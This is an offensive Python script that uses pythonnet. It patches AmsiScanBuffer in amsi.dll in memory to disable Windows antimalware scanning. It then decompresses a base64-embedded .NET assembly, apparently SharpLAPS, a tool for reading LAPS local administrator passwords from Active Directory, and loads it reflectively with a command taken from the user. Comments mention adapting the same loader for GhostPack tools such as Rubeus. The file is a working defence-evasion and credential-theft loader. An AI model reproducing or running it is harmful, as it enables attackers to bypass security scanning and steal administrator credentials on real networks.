import base64
import zlib
import argparse
import clr
import ctypes
from ctypes import *
import System
from System import Array, IntPtr, UInt32
from System.Reflection import Assembly
import System.Reflection as Reflection

# Ensure necessary .NET references are added
clr.AddReference("System.Management.Automation")

from System.Management.Automation import Runspaces, RunspaceInvoke
from System.Runtime.InteropServices import Marshal

base64_str = "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"


def bypass():
    """
    Bypasses the Antimalware Scan Interface (AMSI) by patching the AmsiScanBuffer method in amsi.dll.
    This allows scripts to run without being scanned and potentially blocked by AMSI.
    """
    windll.LoadLibrary("amsi.dll")
    windll.kernel32.GetModuleHandleW.argtypes = [c_wchar_p]
    windll.kernel32.GetModuleHandleW.restype = c_void_p
    handle = windll.kernel32.GetModuleHandleW('amsi.dll')
    windll.kernel32.GetProcAddress.argtypes = [c_void_p, c_char_p]
    windll.kernel32.GetProcAddress.restype = c_void_p
    BufferAddress = windll.kernel32.GetProcAddress(handle, "AmsiScanBuffer")
    BufferAddress = IntPtr(BufferAddress)
    Size = System.UInt32(0x05)
    ProtectFlag = System.UInt32(0x40)
    OldProtectFlag = Marshal.AllocHGlobal(0)
    virt_prot = windll.kernel32.VirtualProtect(BufferAddress, Size, ProtectFlag, OldProtectFlag)
    patch = System.Array[System.Byte]((System.UInt32(0xB8), System.UInt32(0x57), System.UInt32(0x00), System.UInt32(0x07), System.UInt32(0x80), System.UInt32(0xC3)))
    Marshal.Copy(patch, 0, BufferAddress, 6)

def base64_to_bytes(base64_string):
    """
    Converts a base64 encoded string to a .NET byte array after decompressing it.
    Args:
        base64_string: The base64 encoded and compressed string to convert.
    Returns:
        A .NET byte array of the decompressed data.
    """
    # Decode the base64 string to get the compressed binary data
    compressed_data = base64.b64decode(base64_string)
    # Decompress the data
    decompressed_data = zlib.decompress(compressed_data)
    # Convert the decompressed binary data to a .NET byte array
    return System.Array[System.Byte](decompressed_data)

def load_and_execute_assembly(command):
    """
    Loads a .NET assembly from a base64 encoded and compressed string, and executes a specified method.
    Args:
        command: The command to execute within the loaded assembly.
    Returns:
        The result of the executed command.
    """
    
    assembly_bytes = base64_to_bytes(base64_str)
    
    # Load the assembly
    assembly = Assembly.Load(assembly_bytes)
    
    # Get the type of the Rubeus.Program class
    program_type = assembly.GetType("SharpLAPS.Program")
    # You don't need to create an instance of the class for a static method
    method = program_type.GetMethod("MainString")
    #Have to do this nesting thing to deal with different main entry points and public/private methods  
    if method == None:
        method =program_type.GetMethod("Main")
        if method == None:
            method = program_type.GetMethod("Main",Reflection.BindingFlags.NonPublic | Reflection.BindingFlags.Static)
        # Create a jagged array to pass in an array of string arrays to satisfy arguments requirements
        command_array = Array[str]([command])
        command_args = System.Array[System.Object]([command_array])
    else:
        #Ghost Pack stuff like rubeus use a different input
        command_args = Array[str]([command]) 

    # Invoke the MainString method
    result = method.Invoke(None, command_args)

    return result
    
def main():
    bypass()
    parser = argparse.ArgumentParser(description='Execute a command on a hardcoded base64 encoded assembly')
    parser.add_argument('command', type=str, nargs='?', default="", 
                        help='Command to execute (like "help" or "triage"). If not specified, a default command is executed.')

    args = parser.parse_args()
    
    result = load_and_execute_assembly(args.command)
    print(result)

if __name__ == "__main__":
    main()